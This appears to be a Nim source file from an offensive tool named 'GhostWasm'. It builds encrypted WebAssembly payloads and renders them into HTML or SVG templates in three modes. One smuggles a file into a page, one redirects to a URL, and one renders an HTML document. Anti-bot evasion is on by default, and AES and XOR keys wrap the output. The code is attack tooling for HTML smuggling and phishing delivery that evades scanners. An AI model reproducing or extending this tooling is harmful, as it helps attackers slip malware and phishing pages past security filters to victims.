
import strutils
import std/strformat
import std/sequtils
import os

import templating
import constants_types
import utils


proc smuggle*(filepath: string, filename: string, output_name: string = "", output_path: string = ".", antibot_disable=false): bool = 
  echo "Listing templates: "
  let templates = CONST_TEMPLATES.filterIt("smuggle" in it.name.split("_")[0])
  pprint_templates(templates)

  write(stdout, "Select the template: ")
  var is_svg = false
  var idx = parseInt(readLine(stdin))
  while idx > templates.len-1:
    write(stdout, &"Please select a template: ")
    idx = parseInt(readLine(stdin))
  
  var template_name = templates[idx].name
  if templates[idx].svg.len != 0:
    is_svg = true

  echo "Compiling WASM builder..."
  let wasm_filename = SCRIPT_BASE_DIR / "builder" / "builder.wasm"
  let compile_cmd = if antibot_disable: 
      &"nim c -d:release -d:smuggle -d:filepath:{filepath} -d:filename:{filename} --out:{wasm_filename} builder.nim"
    else:
      &"nim c -d:release -d:smuggle -d:antibot -d:filepath:{filepath} -d:filename:{filename} --out:{wasm_filename} builder.nim"

  compile_wasm(compile_cmd)

  var wasm: WasmObject
  wasm.wasmBytes = read_file_bytes(wasm_filename)
  wasm.signature = "GhostWasm Generated Payload"
  wasm.aesKey = gen_aes_key()
  wasm.aesIv = gen_aes_iv()
  wasm.xorKey = gen_xorkey(16)
  wasm.name = output_name

  removeFile(wasm_filename)

  let rendered = renderFiles(wasm, template_name)
  write_templates(rendered, template_name, output_name, output_path)
  
  print_encryption_keys(wasm)



proc redirect*(url: string, output_name: string = "", output_path: string = ".", antibot_disable=false): bool = 
  echo "Listing templates: "
  let templates = CONST_TEMPLATES.filterIt("redirect" in it.name.split("_")[0])
  pprint_templates(templates)

  write(stdout, "Select the template: ")
  var is_svg = false
  var idx = parseInt(readLine(stdin))
  while idx > templates.len-1:
    write(stdout, &"Please select a template: ")
    idx = parseInt(readLine(stdin))
  
  var template_name = templates[idx].name
  if templates[idx].svg.len != 0:
    is_svg = true

  echo "Compiling WASM builder..."
  let wasm_filename = SCRIPT_BASE_DIR / "builder" / "builder.wasm"
  let compile_cmd = if antibot_disable: 
      &"nim c -d:release -d:redirect -d:url:{url} --out:{wasm_filename} builder.nim"
    else:
      &"nim c -d:release -d:redirect -d:antibot -d:url:{url} --out:{wasm_filename} builder.nim"

  compile_wasm(compile_cmd)

  var wasm: WasmObject
  wasm.wasmBytes = read_file_bytes(wasm_filename)
  wasm.signature = "GhostWasm Generated Payload"
  wasm.aesKey = gen_aes_key()
  wasm.aesIv = gen_aes_iv()
  wasm.xorKey = gen_xorkey(16)
  wasm.name = output_name

  removeFile(wasm_filename)

  let rendered = renderFiles(wasm, template_name)
  write_templates(rendered, template_name, output_name, output_path)
  
  print_encryption_keys(wasm)


proc html*(filepath: string, output_name: string = "", output_path: string = ".", antibot_disable=false): bool = 
  echo "Listing templates: "
  let templates = CONST_TEMPLATES.filterIt("html" in it.name.split("_")[0])
  pprint_templates(templates)

  write(stdout, "Select the template: ")
  var is_svg = false
  var idx = parseInt(readLine(stdin))
  while idx > templates.len-1:
    write(stdout, &"Please select a template: ")
    idx = parseInt(readLine(stdin))
  
  var template_name = templates[idx].name
  if templates[idx].svg.len != 0:
    is_svg = true

  echo "Compiling WASM builder..."
  let wasm_filename = SCRIPT_BASE_DIR / "builder" / "builder.wasm"
  let compile_cmd = if antibot_disable: 
      &"nim c -d:release -d:html -d:svgdocument={is_svg} -d:filepath:{filepath} --out:{wasm_filename} builder.nim"
    else:
      &"nim c -d:release -d:html -d:svgdocument={is_svg} -d:antibot -d:filepath:{filepath} --out:{wasm_filename} builder.nim"

  compile_wasm(compile_cmd)

  var wasm: WasmObject
  wasm.wasmBytes = read_file_bytes(wasm_filename)
  wasm.signature = "GhostWasm Generated Payload"
  wasm.aesKey = gen_aes_key()
  wasm.aesIv = gen_aes_iv()
  wasm.xorKey = gen_xorkey(16)
  wasm.name = output_name

  removeFile(wasm_filename)

  let rendered = renderFiles(wasm, template_name)
  write_templates(rendered, template_name, output_name, output_path)

  print_encryption_keys(wasm)